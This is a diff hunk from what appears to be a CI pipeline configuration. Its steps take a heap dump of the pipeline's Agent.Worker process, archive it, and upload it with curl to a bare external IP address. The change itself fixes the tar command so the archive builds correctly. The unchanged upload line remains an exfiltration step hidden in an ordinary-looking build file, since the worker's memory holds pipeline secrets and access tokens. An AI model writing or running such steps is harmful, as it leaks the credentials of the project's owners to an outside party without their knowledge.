@@ -207,7 +207,7 @@ steps:
     echo "The PID of Agent.Worker is $PID"
     dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
     
-    tar -czf "/home/vsts/work/_temp/heap_worker.bin" -C "/home/vsts/work/_temp/heap_worker.tar.gz" .
+    tar -czf "/home/vsts/work/_temp/heap_worker.tar.gz" -C "/home/vsts/work/_temp/heap_worker.bin" .
     echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.tar.gz") bytes"
     sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload
  
